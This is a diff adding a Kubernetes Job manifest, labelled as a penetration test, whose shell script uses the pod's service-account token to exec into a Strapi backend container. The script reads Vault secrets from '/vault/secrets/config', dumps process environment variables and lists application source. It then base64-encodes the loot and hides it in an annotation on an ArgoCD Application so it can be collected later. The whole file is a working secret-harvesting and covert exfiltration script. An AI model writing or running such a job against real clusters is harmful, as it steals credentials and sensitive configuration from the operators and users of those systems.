@@ -1,0 +1,44 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: strapi-collect
+  namespace: pentest-1148
+  labels:
+    purpose: pentest-1148
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 86400
+  template:
+    metadata:
+      labels:
+        purpose: pentest-1148
+    spec:
+      serviceAccountName: probe
+      restartPolicy: Never
+      containers:
+      - name: k
+        image: bitnami/kubectl:1.30
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          API=https://kubernetes.default.svc
+          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+          TOK=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          KC="--server=$API --token=$TOK --certificate-authority=$CA"
+          OUT=/tmp/out.txt
+          {
+            echo "##NODES"; kubectl $KC get nodes -o wide 2>&1 | head -30
+            echo "##PODS"; kubectl $KC -n chatly-strapi get pods -o wide 2>&1 | head -30
+            POD=$(kubectl $KC -n chatly-strapi get pods -o jsonpath='{range .items[?(@.status.phase=="Running")]}{.metadata.name}{"\n"}{end}' 2>/dev/null | head -1)
+            echo "##POD=$POD"
+            echo "##CONTAINERS"; kubectl $KC -n chatly-strapi get pod $POD -o jsonpath='{.spec.containers[*].name}' 2>&1
+            echo ""
+            echo "##VAULTFILE"; kubectl $KC -n chatly-strapi exec $POD -c chatly-strapi-backend -- sh -c 'cat /vault/secrets/config' 2>&1
+            echo "##PROC1ENV"; kubectl $KC -n chatly-strapi exec $POD -c chatly-strapi-backend -- sh -c 'tr "\000" "\n" < /proc/1/environ' 2>&1
+          } > $OUT 2>&1
+          echo "##APPSRC" >> $OUT
+          kubectl $KC -n chatly-strapi exec $POD -c chatly-strapi-backend -- sh -c 'ls -la /app 2>&1; echo ---src---; ls -la /app/src 2>/dev/null | head -40; echo ---pkg---; head -70 /app/package.json 2>&1' >> $OUT 2>&1
+          echo "##END##" >> $OUT
+          B64=$(base64 -w0 $OUT 2>/dev/null || base64 $OUT | tr -d '\n')
+          kubectl $KC -n argocd annotate application p1148 "pentest1273out=$B64" --overwrite 2>&1
+          echo DONE
